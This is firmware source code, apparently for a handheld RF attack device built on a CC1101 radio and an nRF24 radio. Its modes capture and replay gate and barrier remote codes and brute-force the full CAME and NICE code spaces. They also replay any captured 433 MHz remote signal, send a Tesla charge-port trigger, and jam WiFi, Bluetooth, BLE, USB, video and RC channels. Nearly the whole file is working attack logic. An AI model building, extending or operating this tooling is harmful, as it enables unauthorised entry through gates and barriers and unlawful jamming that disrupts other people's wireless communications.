#include "functions.h"

void setup()
{
  Serial.begin(115200);
  Serial.printf("Starting %s %s\n\n", APP_NAME, APP_VERSION);

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  SPI.setSCK(2);
  SPI.setTX(3);
  SPI.setRX(4);
  SPI.begin();

  cc1101Init();

  SPI1.setSCK(10);
  SPI1.setTX(11);
  SPI1.setRX(12);
  SPI1.begin();

  radio_RF24.begin(&SPI1);

  analogReadResolution(12);
  batVoltage = readBatteryVoltage();

  communication.setRadioNRF24();
  communication.setSlaveMode();
  communication.init();

  Serial.printf("Current mode: %d\n\n", currentMode);

  currentLedMode = LED_ON;
}

void setup1()
{
}

// Loop for common tasks
void loop1()
{
  uint32_t now = millis();
  uint16_t onTime = 0, offTime = 0;

  switch (currentLedMode)
  {
  case LED_ON:
    digitalWrite(LED_BUILTIN, HIGH);
    return;

  case LED_OFF:
    digitalWrite(LED_BUILTIN, LOW);
    return;

  case LED_BLINK_SLOW:
    onTime = 500;
    offTime = 500;
    break;

  case LED_BLINK_FAST:
    onTime = 100;
    offTime = 800;
    break;
  }

  if ((ledState && now - ledTimer >= onTime) || (!ledState && now - ledTimer >= offTime))
  {
    ledState = !ledState;
    digitalWrite(LED_BUILTIN, ledState);
    ledTimer = now;
  }

  switch (currentMode)
  {
  case IDLE:
  {
    if (!initializedIdle)
    {
      if (succsessfulConnection)
      {
        switch (currentMode)
        {
        case UHF_SPECTRUM:
        case UHF_ALL_JAMMER:
        case UHF_WIFI_JAMMER:
        case UHF_BT_JAMMER:
        case UHF_BLE_JAMMER:
        case UHF_USB_JAMMER:
        case UHF_VIDEO_JAMMER:
        case UHF_RC_JAMMER:
          stopRadioAttack();
          break;
        }

        currentLedMode = LED_BLINK_SLOW;
      }

      Serial.println("Initializing Idle mode...");
      // ELECHOUSE_cc1101.goSleep();
      communication.setRadioNRF24();
      communication.setSlaveMode();
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      detachInterrupt(GD0_PIN_CC);
      digitalWrite(GD0_PIN_CC, LOW);
      initializedIdle = true;
      initialized = false;
      attackIsActive = false;
    }
    break;
  }
  case HF_SPECTRUM:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Spectrum mode...");
      cc1101ReadyMode();
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }

    break;
  }
  case HF_ACTIVITY:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Activity mode...");
      cc1101ReadyMode();
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }

    break;
  }
  case HF_BARRIER_SCAN:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Barrier Scan mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, INPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetRx(radioFrequency);
      attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }

    if (anMotorsCaptured || cameCaptured || niceCaptured)
    {
      anMotorsCaptured = false;
      niceCaptured = false;
      cameCaptured = false;

      // Repeating the signal
      pinMode(GD0_PIN_CC, OUTPUT);
      ELECHOUSE_cc1101.SetTx(radioFrequency);

      if (barrierProtocol == 0)
      {
        sendANMotors(barrierCodeMain, barrierCodeAdd);
      }
      else if (barrierProtocol == 1)
      {
        sendNice(barrierCodeMain);
      }
      else if (barrierProtocol == 2)
      {
        sendCame(barrierCodeMain);
      }

      initialized = false;
    }

    break;
  }
  case HF_BARRIER_REPLAY:
  {
    static uint32_t attackTimer = now;

    if (!initialized)
    {
      Serial.println("Initializing HF Barrier Replay mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, INPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetRx(radioFrequency);
      attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }

    if (anMotorsCaptured || cameCaptured || niceCaptured)
    {
      anMotorsCaptured = false;
      niceCaptured = false;
      cameCaptured = false;

      // Repeating the signal
      pinMode(GD0_PIN_CC, OUTPUT);
      detachInterrupt(GD0_PIN_CC);
      ELECHOUSE_cc1101.SetTx(radioFrequency);

      attackIsActive = true;
    }

    if (attackIsActive && now - attackTimer >= 1000)
    {
      if (barrierProtocol == 0)
      {
        sendANMotors(barrierCodeMain, barrierCodeAdd);
      }
      else if (barrierProtocol == 1)
      {
        sendNice(barrierCodeMain);
      }
      else if (barrierProtocol == 2)
      {
        sendCame(barrierCodeMain);
      }
      attackTimer = now;
    }

    break;
  }
  case HF_BARRIER_BRUTE_CAME:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Barrier Brute CAME mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, OUTPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetTx(raFrequencies[1]);
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }

    static int16_t barrierBruteIndex = 4095;
    static uint32_t lastSendTime = now;

    if (now - lastSendTime > 50)
    {
      lastSendTime = now;

      if (barrierBruteIndex >= 0)
      {
        sendCame(barrierBruteIndex);
        barrierBruteIndex--;
      }
      if (barrierBruteIndex < 0)
      {
        barrierBruteIndex = 4095;
        currentMode = IDLE;
      }
    }

    break;
  }
  case HF_BARRIER_BRUTE_NICE:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Barrier Brute NICE mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, OUTPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetTx(raFrequencies[1]);
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }

    static int16_t barrierBruteIndex = 4095;
    static uint32_t lastSendTime = now;

    if (now - lastSendTime > 50)
    {
      lastSendTime = now;

      if (barrierBruteIndex >= 0)
      {
        sendNice(barrierBruteIndex);
        barrierBruteIndex--;
      }
      if (barrierBruteIndex < 0)
      {
        barrierBruteIndex = 4095;
        currentMode = IDLE;
      }
    }

    break;
  }
  case HF_SCAN:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Scan mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, INPUT);
      mySwitch.disableTransmit();
      mySwitch.enableReceive(GD0_PIN_CC);
      ELECHOUSE_cc1101.SetRx(radioFrequency);
      mySwitch.resetAvailable();
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }

    if (mySwitch.available())
    {
      // Check if the signal is valid
      if (mySwitch.getReceivedBitlength() < 10)
      {
        mySwitch.resetAvailable();
        break;
      }

      // Reapiting the signal
      mySwitch.disableReceive();
      mySwitch.enableTransmit(GD0_PIN_CC);
      pinMode(GD0_PIN_CC, OUTPUT);
      ELECHOUSE_cc1101.SetTx(radioFrequency);

      mySwitch.setProtocol(mySwitch.getReceivedProtocol());
      mySwitch.setRepeatTransmit(10);
      mySwitch.setPulseLength(mySwitch.getReceivedDelay());
      mySwitch.send(mySwitch.getReceivedValue(), mySwitch.getReceivedBitlength());

      mySwitch.resetAvailable();
      initialized = false;
    }

    break;
  }
  case HF_REPLAY:
  {
    static uint32_t attackTimer = now;

    if (!initialized)
    {
      Serial.println("Initializing HF Replay mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, INPUT);
      mySwitch.disableTransmit();
      mySwitch.enableReceive(GD0_PIN_CC);
      ELECHOUSE_cc1101.SetRx(radioFrequency);
      mySwitch.resetAvailable();
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }

    if (!attackIsActive && mySwitch.available())
    {
      // Check if the signal is valid
      if (mySwitch.getReceivedBitlength() < 10)
      {
        mySwitch.resetAvailable();
        break;
      }

      // Reapiting the signal
      mySwitch.disableReceive();
      mySwitch.enableTransmit(GD0_PIN_CC);
      pinMode(GD0_PIN_CC, OUTPUT);
      ELECHOUSE_cc1101.SetTx(radioFrequency);

      mySwitch.setProtocol(mySwitch.getReceivedProtocol());
      mySwitch.setRepeatTransmit(10);
      mySwitch.setPulseLength(mySwitch.getReceivedDelay());
      attackIsActive = true;
    }

    if (attackIsActive && now - attackTimer >= 1000)
    {
      mySwitch.send(mySwitch.getReceivedValue(), mySwitch.getReceivedBitlength());
      attackTimer = now;
    }

    break;
  }
  case HF_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Jammer mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, OUTPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetTx(raFrequencies[1]);
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }

    static uint32_t lastNoise = 0;
    static bool noiseState = false;
    uint32_t nowMicros = micros();

    // changeFreqButtons("TX");

    if (nowMicros - lastNoise > 500)
    {
      noiseState = !noiseState;
      digitalWrite(GD0_PIN_CC, noiseState);
      lastNoise = nowMicros;
    }

    break;
  }
  case HF_TESLA:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Tesla mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, OUTPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetTx(raFrequencies[1]);
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }

    static bool toggleFreq = false;
    float freq = toggleFreq ? 315.0 : 433.92;
    ELECHOUSE_cc1101.SetTx(freq);
    toggleFreq = !toggleFreq;

    sendTeslaSignal_v1();
    delay(50);
    sendTeslaSignal_v2();
    delay(50);

    break;
  }

  // Handle UHF modes
  case UHF_SPECTRUM:
  {
    break;
  }
  case UHF_ALL_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing UHF All Jammer mode...");
      communication.setRadioCC1101();
      communication.init();
      initRadioAttack();
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }
    int randomIndex = random(0, sizeof(full_channels) / sizeof(full_channels[0]));
    radioChannel = full_channels[randomIndex];
    radio_RF24.setChannel(radioChannel);
    break;
  }
  case UHF_WIFI_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing UHF WiFi Jammer mode...");
      communication.setRadioCC1101();
      communication.init();
      initRadioAttack();
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }
    int randomIndex = random(0, sizeof(wifi_channels) / sizeof(wifi_channels[0]));
    radioChannel = wifi_channels[randomIndex];
    radio_RF24.setChannel(radioChannel);
    break;
  }
  case UHF_BT_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing UHF Bluetooth Jammer mode...");
      communication.setRadioCC1101();
      communication.init();
      initRadioAttack();
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }
    int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
    radioChannel = bluetooth_channels[randomIndex];
    radio_RF24.setChannel(radioChannel);
    break;
  }
  case UHF_BLE_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing UHF BLE Jammer mode...");
      communication.setRadioCC1101();
      communication.init();
      initRadioAttack();
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }
    int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
    radioChannel = ble_channels[randomIndex];
    radio_RF24.setChannel(radioChannel);
    break;
  }
  case UHF_USB_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing UHF USB Jammer mode...");
      communication.setRadioCC1101();
      communication.init();
      initRadioAttack();
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }
    int randomIndex = random(0, sizeof(usb_channels) / sizeof(usb_channels[0]));
    radioChannel = usb_channels[randomIndex];
    radio_RF24.setChannel(radioChannel);
    break;
  }
  case UHF_VIDEO_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing UHF VIDEO Jammer mode...");
      communication.setRadioCC1101();
      communication.init();
      initRadioAttack();
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }
    int randomIndex = random(0, sizeof(video_channels) / sizeof(video_channels[0]));
    radioChannel = video_channels[randomIndex];
    radio_RF24.setChannel(radioChannel);
    break;
  }
  case UHF_RC_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing UHF RC Jammer mode...");
      communication.setRadioCC1101();
      communication.init();
      initRadioAttack();
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }
    int randomIndex = random(0, sizeof(rc_channels) / sizeof(rc_channels[0]));
    radioChannel = rc_channels[randomIndex];
    radio_RF24.setChannel(radioChannel);
    break;
  }
  }
}

// Loop for communication tasks
void loop()
{
  uint32_t now = millis();

  if (!succsessfulConnection && communication.checkConnection(5000))
  {
    Serial.println("Connection established");
    succsessfulConnection = true;
    currentLedMode = LED_BLINK_SLOW;
  }

  if (succsessfulConnection && communication.receivePacket(recievedData, &recievedDataLen) && currentMode != UHF_VIDEO_JAMMER)
  {
    currentMode = getModeFromPacket(recievedData, recievedDataLen);
    radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
    Serial.printf("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
    Serial.printf("Received frequency: %.2f MHz\n", radioFrequency);
    initializedIdle = false;
  }

  if (succsessfulConnection && (now - batteryTimer >= BATTERY_CHECK_INTERVAL))
  {
    const uint8_t packetSize = sizeof(batVoltage) + 2;
    uint8_t batteryVoltagePacket[packetSize];

    batteryTimer = millis();
    batVoltage = readBatteryVoltage();
    Serial.printf("Battery voltage: %.2fV\n", batVoltage);
    communication.buildPacket(COMMAND_BATTERY_VOLTAGE, (uint8_t *)&batVoltage, sizeof(batVoltage), batteryVoltagePacket);
    communication.sendPacket(batteryVoltagePacket, packetSize);
  }
}
